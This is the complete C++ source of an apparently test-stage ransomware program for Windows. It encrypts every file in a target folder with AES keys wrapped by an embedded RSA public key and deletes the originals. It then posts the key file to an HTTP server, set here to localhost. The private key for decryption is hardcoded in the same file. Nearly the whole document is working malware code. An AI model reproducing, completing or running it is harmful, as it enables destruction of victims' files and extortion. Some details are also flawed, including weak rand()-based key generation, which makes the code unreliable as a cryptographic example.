#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/pem.h>
#include <openssl/rsa.h>
#include <openssl/err.h>
#include <filesystem>
#include <Windows.h>
#include <winhttp.h>

#include <iomanip>
#include <sstream>

#pragma warning(disable:2360)
#pragma warning(disable:2361)
#pragma warning(disable:4996)
#pragma comment(lib, "winhttp.lib")

namespace fs = std::filesystem;

// Generate random AES key
std::string generateKey() {
    const std::string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    const int keyLength = 32;
    std::string key;
    for (int i = 0; i < keyLength; ++i) {
        key += charset[rand() % charset.length()];
    }
    return key;
}

// Encrypt text using AES-256
std::string encryptText(const std::string& plaintext, const std::string& key) {
    AES_KEY aesKey;
    AES_set_encrypt_key(reinterpret_cast<const unsigned char*>(key.data()), 256, &aesKey);

    unsigned char iv[AES_BLOCK_SIZE];
    RAND_bytes(iv, AES_BLOCK_SIZE);

    std::string ciphertext;
    ciphertext.resize(plaintext.size() + AES_BLOCK_SIZE); // Reserve space for padding

    // Copy IV to the beginning of the ciphertext
    ciphertext.replace(0, AES_BLOCK_SIZE, reinterpret_cast<const char*>(iv), AES_BLOCK_SIZE);

    // Encrypt plaintext
    AES_cbc_encrypt(reinterpret_cast<const unsigned char*>(plaintext.data()),
        reinterpret_cast<unsigned char*>(&ciphertext[AES_BLOCK_SIZE]),
        plaintext.size(), &aesKey, iv, AES_ENCRYPT);

    return ciphertext;
}

// Decrypt text using AES-256
std::string decryptText(const std::string& ciphertext, const std::string& key) {
    AES_KEY aesKey;
    AES_set_decrypt_key(reinterpret_cast<const unsigned char*>(key.data()), 256, &aesKey);

    unsigned char iv[AES_BLOCK_SIZE];
    ciphertext.copy(reinterpret_cast<char*>(iv), AES_BLOCK_SIZE, 0); // Extract IV from the beginning of the ciphertext

    std::string plaintext;
    plaintext.resize(ciphertext.size() - AES_BLOCK_SIZE);

    // Decrypt ciphertext
    AES_cbc_encrypt(reinterpret_cast<const unsigned char*>(&ciphertext[AES_BLOCK_SIZE]),
        reinterpret_cast<unsigned char*>(plaintext.data()),
        plaintext.size(), &aesKey, iv, AES_DECRYPT);

    return plaintext;
}

// Encrypt AES key using RSA public key
std::string encryptAESKeyWithRSA(const std::string& aesKey, RSA* rsaPublicKey) {
    std::string encryptedKey;
    encryptedKey.resize(RSA_size(rsaPublicKey));

    int encryptedSize = RSA_public_encrypt(aesKey.size(), reinterpret_cast<const unsigned char*>(aesKey.data()),
        reinterpret_cast<unsigned char*>(&encryptedKey[0]), rsaPublicKey, RSA_PKCS1_OAEP_PADDING);
    if (encryptedSize == -1) {
        char err[120];
        ERR_load_crypto_strings();
        ERR_error_string(ERR_get_error(), err);
        std::cerr << "Error encrypting AES key with RSA: " << err << std::endl;
        return "";
    }

    encryptedKey.resize(encryptedSize);
    return encryptedKey;
}

// Decrypt AES key using RSA private key
std::string decryptAESKeyWithRSA(const std::string& encryptedKey, RSA* rsaPrivateKey) {
    std::string decryptedKey;
    decryptedKey.resize(RSA_size(rsaPrivateKey));

    int decryptedSize = RSA_private_decrypt(encryptedKey.size(), reinterpret_cast<const unsigned char*>(encryptedKey.data()),
        reinterpret_cast<unsigned char*>(&decryptedKey[0]), rsaPrivateKey, RSA_PKCS1_OAEP_PADDING);
    if (decryptedSize == -1) {
        char err[120];
        ERR_load_crypto_strings();
        ERR_error_string(ERR_get_error(), err);
        std::cerr << "Error decrypting AES key with RSA: " << err << std::endl;
        return "";
    }

    decryptedKey.resize(decryptedSize);
    return decryptedKey;
}

// Load RSA public key from a variable
RSA* loadRSAPublicKey(const std::string& publicKeyData) {
    BIO* bio = BIO_new_mem_buf(publicKeyData.data(), -1);
    if (!bio) {
        std::cerr << "Error: Failed to create BIO for public key." << std::endl;
        return nullptr;
    }
    RSA* rsaPublicKey = PEM_read_bio_RSA_PUBKEY(bio, nullptr, nullptr, nullptr);
    if (!rsaPublicKey) {
        std::cerr << "Error: Failed to load RSA public key." << std::endl;
        BIO_free(bio);
        return nullptr;
    }
    BIO_free(bio);
    return rsaPublicKey;
}

// Load RSA private key from a variable
RSA* loadRSAPrivateKey(const std::string& privateKeyData) {
    BIO* bio = BIO_new_mem_buf(privateKeyData.data(), -1);
    if (!bio) {
        std::cerr << "Error: Failed to create BIO for private key." << std::endl;
        return nullptr;
    }
    RSA* rsaPrivateKey = PEM_read_bio_RSAPrivateKey(bio, nullptr, nullptr, nullptr);
    if (!rsaPrivateKey) {
        std::cerr << "Error: Failed to load RSA private key." << std::endl;
        BIO_free(bio);
        return nullptr;
    }
    BIO_free(bio);
    return rsaPrivateKey;
}

// Encrypt file using AES-256 and RSA for the AES key
void encryptFile(const std::string& inputFile, const std::string& outputFile, RSA* rsaPublicKey, const std::string& keysFilePath) {
    // Generate random AES key
    std::string aesKey = generateKey();

    // Encrypt AES key with RSA
    std::string encryptedAESKey = encryptAESKeyWithRSA(aesKey, rsaPublicKey);
    if (encryptedAESKey.empty()) {
        std::cerr << "Failed to encrypt AES key." << std::endl;
        return;
    }

    // Read original text
    std::ifstream inStream(inputFile);
    if (!inStream) {
        std::cerr << "Error: Unable to open file for reading." << std::endl;
        return;
    }
    std::string plaintext((std::istreambuf_iterator<char>(inStream)), std::istreambuf_iterator<char>());

    // Encrypt plaintext with AES
    std::string ciphertext = encryptText(plaintext, aesKey);

    // Write encrypted text and encrypted AES key to output file
    std::ofstream outStream(outputFile, std::ios::binary | std::ios::trunc);
    if (!outStream) {
        std::cerr << "Error: Unable to open file for writing." << std::endl;
        return;
    }
    outStream << encryptedAESKey.size() << '\n' << encryptedAESKey << ciphertext;

    // Store AES key in keys.txt
    std::ofstream keyStream(keysFilePath, std::ios::app);
    if (!keyStream) {
        std::cerr << "Error: Unable to open keys.txt for writing." << std::endl;
        return;
    }
    keyStream << outputFile << ": " << encryptedAESKey << std::endl;
    std::cout << "Key stored in: " << keysFilePath << std::endl;

    // Delete original file
    inStream.close();
    fs::remove(inputFile);
}

void decryptFile(const std::string& inputFile, const std::string& outputFile, RSA* rsaPrivateKey, const std::string& keysFilePath) {
    // Read encrypted AES key size
    std::ifstream inStream(inputFile, std::ios::binary);
    if (!inStream) {
        std::cerr << "Error: Unable to open file for reading." << std::endl;
        return;
    }
    std::string encryptedAESKeySizeStr;
    std::getline(inStream, encryptedAESKeySizeStr);
    int encryptedAESKeySize = std::stoi(encryptedAESKeySizeStr);

    // Read encrypted AES key
    std::string encryptedAESKey;
    encryptedAESKey.resize(encryptedAESKeySize);
    inStream.read(&encryptedAESKey[0], encryptedAESKeySize);

    // Decrypt AES key with RSA
    std::string aesKey = decryptAESKeyWithRSA(encryptedAESKey, rsaPrivateKey);
    if (aesKey.empty()) {
        std::cerr << "Failed to decrypt AES key." << std::endl;
        return;
    }

    // Read ciphertext
    std::string ciphertext((std::istreambuf_iterator<char>(inStream)), std::istreambuf_iterator<char>());
    inStream.close();

    // Decrypt ciphertext with AES
    std::string plaintext = decryptText(ciphertext, aesKey);

    // Write decrypted text to output file
    std::ofstream outStream(outputFile, std::ios::trunc);
    if (!outStream) {
        std::cerr << "Error: Unable to open file for writing." << std::endl;
        return;
    }
    outStream << plaintext;

    // Delete encrypted file
    fs::remove(inputFile);
}

// Function to read the content of the keys.txt file
std::string readFileContent(const std::string& filePath) {
    std::ifstream file(filePath);
    if (!file.is_open()) {
        throw std::runtime_error("Could not open the file: " + filePath);
    }
    std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    return content;
}

// Helper function to calculate SHA-1 hash of a string
std::string sha1(const std::string& data) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    BYTE rgbHash[20];
    DWORD cbHash = 20;
    CHAR rgbDigits[] = "0123456789abcdef";
    std::ostringstream ss;

    if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT) &&
        CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash) &&
        CryptHashData(hHash, reinterpret_cast<const BYTE*>(data.c_str()), data.length(), 0)) {
        if (CryptGetHashParam(hHash, HP_HASHVAL, rgbHash, &cbHash, 0)) {
            for (DWORD i = 0; i < cbHash; i++) {
                ss << rgbDigits[rgbHash[i] >> 4];
                ss << rgbDigits[rgbHash[i] & 0xf];
            }
        }
    }

    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);

    return ss.str();
}

// Function to send the file content to the HTTP server using WinHTTP
void sendToHttpServer(const std::string& filePath, const std::wstring& url) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    BOOL bResults = FALSE;
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    INTERNET_PORT port = 80;

    std::string fileContent = readFileContent(filePath);
    std::wstring boundary = L"----WebKitFormBoundary7MA4YWxkTrZu0gW";
    std::string boundaryStr = "--" + std::string(boundary.begin(), boundary.end());
    std::string crlf = "\r\n";

    // Print SHA-1 hash of the file content
    std::cout << "SHA-1 hash of file content: " << sha1(fileContent) << std::endl;

    std::string postData;
    postData += boundaryStr + crlf;
    postData += "Content-Disposition: form-data; name=\"file\"; filename=\"keys.txt\"" + crlf;
    postData += "Content-Type: application/octet-stream" + crlf + crlf;
    postData += fileContent + crlf;
    postData += boundaryStr + "--" + crlf;

    URL_COMPONENTS urlComp;
    wchar_t hostName[256];
    wchar_t urlPath[1024];

    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = sizeof(hostName) / sizeof(hostName[0]);
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = sizeof(urlPath) / sizeof(urlPath[0]);

    if (!WinHttpCrackUrl(url.c_str(), (DWORD)url.length(), 0, &urlComp)) {
        std::cerr << "Error: Unable to parse URL." << std::endl;
        return;
    }

    hSession = WinHttpOpen(L"A WinHTTP Example Program/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    if (hSession)
        hConnect = WinHttpConnect(hSession, hostName, urlComp.nPort, 0);

    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"POST", urlPath,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0);

    if (hRequest) {
        std::wstring headers = L"Content-Type: multipart/form-data; boundary=" + boundary;
        bResults = WinHttpSendRequest(hRequest,
            headers.c_str(), (DWORD)-1L,
            (LPVOID)postData.c_str(), (DWORD)postData.length(),
            (DWORD)postData.length(), 0);
    }

    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    if (!bResults) {
        std::cerr << "Error: " << GetLastError() << " occurred during the request." << std::endl;
    }

    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
}

int main(int argc, char * argv[]) {
    std::string example = "REr2.exe e C:\\directory\\...\\TESTfolder";
    // Check the number of parameters
    if (argc < 3) {
        std::cerr << "Usage: " << argv[0] << " <e/d> " << "<path>\nExample: " << example << std::endl;
        return 1;
    }

    std::string publicKeyData = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtLp/fr5lRVzJHIQu8xuH\nxThlD900ICjPKR3+ur2QUaMFayOJj7os/bbnPGeLr2U2HpEP/jln47JTDZ7qXxNG\nveLu9ZlC44cmhmQj1vulaXIWUSJASa7Pgx2G0laow0TZf9pWcS7HRGt4iOfcza/j\n7ndzycnRDf+57nTBlv05rKWgT2SwGW8SOHddotAyMo4UuNkl9jEennU+2PBCL6Qv\n73/WTIi52OKtOGety5bNzRCgXR/nHwdReOBim39chvMDuqzBNLB031luIQmTuB9/\nhNxA+94I1PyGNXrgeaokWz9lZhrIPHQf5tDLuB4NvAIqBSLhs2sfv9ZbcPprxjeP\neQIDAQAB\n-----END PUBLIC KEY-----";

    // Load RSA public key
    RSA* rsaPublicKey = loadRSAPublicKey(publicKeyData);
    if (!rsaPublicKey) {
        std::cerr << "Failed to load RSA public key." << std::endl;
        return 1;
    }

    std::string privateKeyData = "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC0un9+vmVFXMkc\nhC7zG4fFOGUP3TQgKM8pHf66vZBRowVrI4mPuiz9tuc8Z4uvZTYekQ/+OWfjslMN\nnupfE0a94u71mULjhyaGZCPW+6VpchZRIkBJrs+DHYbSVqjDRNl/2lZxLsdEa3iI\n59zNr+Pud3PJydEN/7nudMGW/TmspaBPZLAZbxI4d12i0DIyjhS42SX2MR6edT7Y\n8EIvpC/vf9ZMiLnY4q04Z63Lls3NEKBdH+cfB1F44GKbf1yG8wO6rME0sHTfWW4h\nCZO4H3+E3ED73gjU/IY1euB5qiRbP2VmGsg8dB/m0Mu4Hg28AioFIuGzax+/1ltw\n+mvGN495AgMBAAECggEABCX/xTNY9Gr5JtFrQ835o4T0NOqum/UJLvgZn8Ri1VeO\nSUj14GRf91bvyeAqlv/Av++JKXG8jmp1I5aRP1YcRUGPRfia+MliZf/9yUfaIn3U\nQKUuSpgGUAvTy2zieiZQw8be6GwwIMRCw7Rmyhs5JSvSxEAAr3c+Qlilv5yCarxn\nSjaQPzS+icMHRpn8pV1opXVcFCUvoRCzObMLQ1mWMnTljOjo1p/qkOlG8r7yP0Ic\nTVI5VolBj05i+7zl3iT1COKficFNQjOXE6oma11HLJosnWX62C6LWuOgrvgj9ZqP\ne6zH984Pd0yugv3eNOD9l4CHUrbqDauwObpKYVOTTQKBgQDqLav1VBepo5Lehg1l\nEix7QsJl0CrjhorhEpLuGBjF5ewcaNwzXPkZR17TyL/FCpYmOTUEFWLsN557IMNa\ng4u6kYOzQprKgill0Enp3+K8KgxmFINY+2ZnkUqQ0OEc14IliIRRZP8t7clWId1z\niGHqq3fdChLWVVvA6t+5WnZDWwKBgQDFkcdJTac1GkUmSYdsv19FlmvNrTYzrSji\ncYPLX9Z7VMdJuF8Ga+anB87YiEZxfvi1WC9pdcW7x0BEQqdQSWANHaWM8f+Y3SDW\n69pd2+tT6RNgrWS+HfzB4QA5b1pQcyTQh/HaLkxIs2cEMUYgrtsaytBffl0XV3aY\nA4yGlLfUuwKBgQCLDyXu38nRZZ4AX/AyVZFufJ09oljllW6A6uuvUUXctoT39djU\n81/EgBoyfyJJmtjAx/XQf/anOPv2N+VpqXXfCyv+1g1fNd3pZL+PjvBwNjP4pjO9\nMkSEOcXiqvcSjnLtYNzaDLRvjKWjbSa4xYMHvFzIOIQpHLUIoTDLO4nAwwKBgEmz\nmCRAU5/7rNAbnelzepb7Bjwz4YRllFrk/cVgeyKG/dECdnBu0Bx/TSp5q82rEByW\nSRmOVbU3H0JXmxLYTHyYEqoBnNfppdaHJW7eG2uyBwiJpotFpISu6uaCI67fRVyF\nWjOKEesNAeEOgJqwoAvenN0CxrduaU9MA6Aw2mMBAoGBANa1esD1iX4jINUWJbQ4\nNoIuXrQj1g0nnINuPuXQvWzFquncX43ktb7UcdRb5lb5c4inZ315y6H1AtvObS4k\nS51gHyNiXXxsUKq6uDS2+VRDYkDOKBsPEm6qW2t4AjhZRQis3jpZeqzX5C/mEC4k\ndkoREI+lzCK8YfxvAI0Nyh4+\n-----END PRIVATE KEY-----";

    // Load RSA private key
    RSA* rsaPrivateKey = loadRSAPrivateKey(privateKeyData);
    if (!rsaPrivateKey) {
        std::cerr << "Failed to load RSA private key." << std::endl;
        return 1;
    }

    std::string inputFolder, outputFolder, keysFilePath;

    char * option = argv[1];
    inputFolder = argv[2];

    // Additional variables to help break loop within decryption else if (d)
    std::string ff = "";
    std::string fff = "";
    int cc = 0;

    if (*argv[1] == 'e')
    {
        outputFolder = inputFolder;

        // Create output folder if it doesn't exist
        fs::create_directories(outputFolder);

        // Encrypt files in input folder
        keysFilePath = inputFolder + "/keys.txt";
        for (const auto& entry : fs::directory_iterator(inputFolder)) {
            if (entry.is_regular_file()) {
                std::string inputFile = entry.path().string();
                std::string outputFile = outputFolder + "/" + entry.path().filename().string() + ".enc";
                encryptFile(inputFile, outputFile, rsaPublicKey, keysFilePath);
            }
        }
        std::cout << "Files encrypted." << std::endl;
        cc = 1;
    }
    else if (*argv[1] == 'd') {
        outputFolder = inputFolder;

        // Decrypt files in input folder
        keysFilePath = inputFolder + "/keys.txt";
        for (const auto& entry : fs::directory_iterator(inputFolder)) {
            ff = entry.path().generic_string();
            fff = keysFilePath;
            std::replace(fff.begin(), fff.end(), '\\', '/');

            if (ff == fff) {
                std::cout << ff << std::endl;
                std::cout << keysFilePath << std::endl;
                break;
            }

            if (entry.is_regular_file()) {
                std::string inputFile = entry.path().string();
                std::string outputFile = outputFolder + "/" + entry.path().filename().stem().string();
                decryptFile(inputFile, outputFile, rsaPrivateKey, keysFilePath);
            }
        }
        std::cout << "Files decrypted." << std::endl;
    } 
    else {
        std::cerr << "Invalid option. Please choose e - encrypt or d - decrypt." << std::endl;
        RSA_free(rsaPublicKey);
        RSA_free(rsaPrivateKey);
        return 1;

    }

    // Free RSA keys
    RSA_free(rsaPublicKey);
    RSA_free(rsaPrivateKey);
    if (cc == 1) {
        try {
            //read the content of keys.txt
            std::wstring url = L"http://localhost:8080";

            //send file
            sendToHttpServer(keysFilePath, url);
        }
        catch (const std::exception& e) {
            std::cerr << "An error occured: " << e.what() << std::endl;
            return 1;
        }
    }

    return 0;
}